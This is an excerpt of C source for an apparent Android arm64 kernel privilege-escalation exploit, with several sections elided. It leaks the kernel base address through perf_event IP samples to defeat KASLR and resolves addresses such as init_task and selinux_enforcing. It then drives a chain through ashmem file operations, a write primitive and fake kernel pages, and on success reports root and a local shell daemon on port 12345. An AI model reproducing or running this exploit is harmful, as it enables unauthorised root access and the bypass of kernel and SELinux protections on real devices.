...
static uint64_t perf_ring_u64(const uint8_t *ring, uint64_t ring_size,
                              uint64_t pos) {
  uint64_t value;
...
/* Shell context on the production S0029 image exposes kernel IP samples.
 * The arm64 image base is 2 MiB aligned and this linked _text is +0x80000. */
static uint64_t detect_runtime_text_base(void) {
  ...
  if (meta == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 2000000; i++) (void)syscall(__NR_gettid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  uint64_t head = meta->data_head, tail = meta->data_tail;
  ...
  while (tail + sizeof(struct perf_event_header) <= head) {
    ...
    if (off + sizeof(hdr) <= ring_size) memcpy(&hdr, ring + off, sizeof(hdr));
    else {
    ...
    if (hdr.type == PERF_RECORD_SAMPLE) {
      ...
      uint64_t ip = perf_ring_u64(ring, ring_size, pos);
      pos += 16;
      uint64_t nr = perf_ring_u64(ring, ring_size, pos);
      pos += 8;
      if (ip >= 0xffff000000000000ULL && ip < minimum) {
        minimum = ip; found++;
      }
      for (uint64_t i = 0; i < nr && pos + 8 <= tail + hdr.size; i++) {
        uint64_t candidate = perf_ring_u64(ring, ring_size, pos);
        pos += 8;
        if (candidate >= 0xffff000000000000ULL && candidate < minimum) {
  ...
  close(fd);
  if (!found || minimum == UINT64_MAX) return 0;
  return (minimum & ~0x1fffffULL) + 0x80000ULL;
}

static int initialize_runtime_slide(void) {
  uint64_t detected = detect_runtime_text_base();
  if (!detected) {
    pr_error("KASLR detection through perf failed errno=%d\n", errno);
    return 0;
  }
  kaslr_base = detected;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_success("KASLR _text=%016llx slide=%016llx\n",
...
int run_exploit(int argc, char **argv) {
  ...
  if (!initialize_runtime_slide()) return 1;
  ...
  int umh_available = active_offsets && active_offsets->off_ashmem_misc_fops;
  ...
  if (!selinux_ok && !root_child_done) {
    pr_error("R6 fops/configfs route failed; refusing incompatible direct-tree fallback\n");
    return 1;
  ...
  if (root_child_done) {
    pr_success("root verified; shell daemon listening on 127.0.0.1:12345\n");
...
int main(int argc, char **argv) {
    ...
    if (argc > 1 && strcmp(argv[1], "--preflight") == 0) {
        set_unbuffer();
        if (select_offsets() < 0 || !initialize_runtime_slide()) return 1;
        pr_info("preflight init_task=%016zx selinux_enforcing=%016zx "
                "ashmem_misc_fops=%016zx\n",
                kaslr_image_addr(INIT_TASK),
                kaslr_image_addr(SELINUX_ENFORCING),
                kaslr_image_addr(ASHMEM_MISC_FOPS));
        return 0;
    }
    if (argc > 1 && strcmp(argv[1], "--page-preflight") == 0) {
        set_unbuffer();
        set_limit();
        if (select_offsets() < 0 || !initialize_runtime_slide()) return 1;
        init_ashmem_path();
        pin_to_core(CORE);
        set_pselect_write_mode(kaslr_image_addr(ASHMEM_MISC_FOPS), 0, 4);
        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
        pr_info("page preflight base=%016zx fake_lock=%016zx fake_task=%016zx "
